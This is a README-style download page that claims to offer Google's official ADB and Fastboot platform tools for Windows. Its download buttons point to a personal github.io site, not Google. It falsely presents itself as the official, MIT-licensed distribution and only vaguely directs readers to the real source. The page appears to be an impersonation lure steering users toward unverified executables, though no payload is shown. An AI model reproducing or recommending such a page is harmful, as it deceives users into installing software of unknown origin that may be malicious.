# ADB Platform Tools – Fast Android Command Line for Windows

ADB Platform Tools is a small, official command-line package for Windows that arms developers with the Android Debug Bridge and Fastboot to control Android devices from the desktop.

<div align="center">
  <img src="https://play-lh.googleusercontent.com/LE2-8hjLVmfDhjBtFoLrJThiqRyT68O1jCKE9ZQWUGOGHGBq9BETGvrMzeOZijpE_B6WK5tCD-lEp8ezL3BogBg=w240-h480-rw" alt="ADB Platform Tools Logo" width="25%"/>
</div>

<div align="center">

  ![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
  ![License](https://img.shields.io/badge/License-MIT-green)

</div>

<div align="center">
  <h3>★ Small download, serious control over every Android device on your Windows PC ★</h3>

  [![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools_for_Windows-C62828?style=for-the-badge)](https://robertpierce136.github.io/.github/Android-ADB-Platform-Tools-Windows)

</div>

---

- [📝 Summary](#-summary)
- [🎯 Feature Set](#-feature-set)
- [🎬 In Action](#-in-action)
- [🧾 What You Need](#-what-you-need)
- [🪜 Installation Steps](#-installation-steps)
- [🚀 Getting Started](#-getting-started)
- [❓ FAQ](#-faq)
- [💬 Support](#-support)
- [📄 License](#-license)

---

## 📝 Summary

ADB Platform Tools for Windows is Google's official, no-nonsense package containing the Android Debug Bridge and Fastboot. It downloads as a tiny archive, extracts in moments, and immediately gives you a direct command-line channel to any Android phone, tablet, or emulator connected to your PC.

From this one folder you can debug live devices, install and remove apps, transfer files, follow logs as they scroll, and — with Fastboot — flash images to storage partitions on supported hardware. It is the same trusted platform tools ADB and Fastboot set that Android professionals depend on, published free by Google and updated with every new Android release.

## 🎯 Feature Set

1. Connect to any device or emulator with the Android Debug Bridge and run shell commands over USB or Wi-Fi 🌉
2. Flash partitions and boot images through Fastboot on devices whose makers allow unlocking ⚡
3. Install, update, and remove APK packages directly from the command line for rapid build testing 📥
4. Push files to a device and pull them back with quick, scriptable transfer commands 🔄
5. Stream logcat output live to trace crashes and study app behavior in real time 📜
6. Rely on the official Google package that stays free and current with each Android version 🆓

## 🎬 In Action

<div align="center">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLMfnwQJgbIJYYl3sQws3tzfgjquiGf5G6VkQxzuDeELDkzPSZJ4VPkQ41&s=10" alt="ADB Platform Tools session on a Windows desktop" width="80%"/>
</div>

The capture above shows a live session on a Windows desktop, with the bridge listing an attached device and a log stream running alongside the command prompt.

## 🧾 What You Need

| Requirement | Minimum |
| --- | --- |
| Operating System | Windows 10 or Windows 11 (64-bit); earlier 64-bit Windows releases work as well |
| Processor | A modern 64-bit processor |
| Memory | 2 GB RAM or more |
| Storage | Roughly 100 MB of free space for the extracted tools |
| Connection | A USB port and data cable, or a shared local network for wireless ADB |
| Drivers | Your device's USB driver, or Google's generic USB driver for Windows |

## 🪜 Installation Steps

1. Press the download button to obtain the official Windows platform tools archive from Google.
2. Extract the ZIP to a simple folder such as `C:\platform-tools`.
3. Verify that `adb.exe` and `fastboot.exe` appear in the folder.
4. Add the folder to your Windows PATH if you want to call the commands from anywhere.
5. No setup wizard is needed — the tools run straight from the extracted folder.

## 🚀 Getting Started

1. Open Settings on the device, go to About phone, and tap Build number seven times to reveal Developer options.
2. Enable USB debugging under Developer options.
3. Connect the device to your Windows PC with a data-capable cable.
4. In the platform-tools folder, open a terminal and run `adb devices`.
5. Accept the authorization prompt on the phone, and the device is ready for adb and Fastboot commands.

## ❓ FAQ

**Which tools come in the package?**
You get the Android Debug Bridge, Fastboot, and the small support files they need — the exact command-line set Google ships inside the Android SDK.

**Is it free to download and use?**
Yes. Google offers the platform tools at no cost as part of the official Android SDK.

**Do I need any other software first?**
Not for the basics. Enabling USB debugging on the phone and having the right USB driver installed is all that is required.

**Why is my device listed as offline?**
An offline status usually means the debugging authorization is pending or the connection dropped. Re-accept the prompt, reseat the cable, and restart the bridge if needed.

**Can I run these tools from a script?**
Definitely. Both programs are command-line native, so they fit neatly into batch files, PowerShell, and automated testing routines.

## 💬 Support

Guidance ships with the tools themselves — run `adb --help` or `fastboot --help` to see the complete command reference inside your Windows terminal. For broader reading, Google's official Android developer documentation covers debugging, the bridge design, and flashing in depth, and you can reach it through the official Android developer website by searching its name in a browser. Developer communities and technical Q&A sites offer additional device-specific help. Because these are authentic Google utilities, most connection issues come down to drivers, so keeping your Windows USB drivers current is the best routine fix.

---

<div align="center">
  <h3>Ready to get started with ADB Platform Tools?</h3>

  [![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools_for_Windows-C62828?style=for-the-badge)](https://robertpierce136.github.io/.github/Android-ADB-Platform-Tools-Windows)

</div>

## License
This project is licensed under the **MIT License** — you are free to use, copy, modify, and distribute it. The full MIT License text is provided in the LICENSE file included with the project.

---

<div align="center">
  <sub>Grab ADB Platform Tools for Windows once and keep the full power of the Android command line ready on your desktop.</sub>
</div>
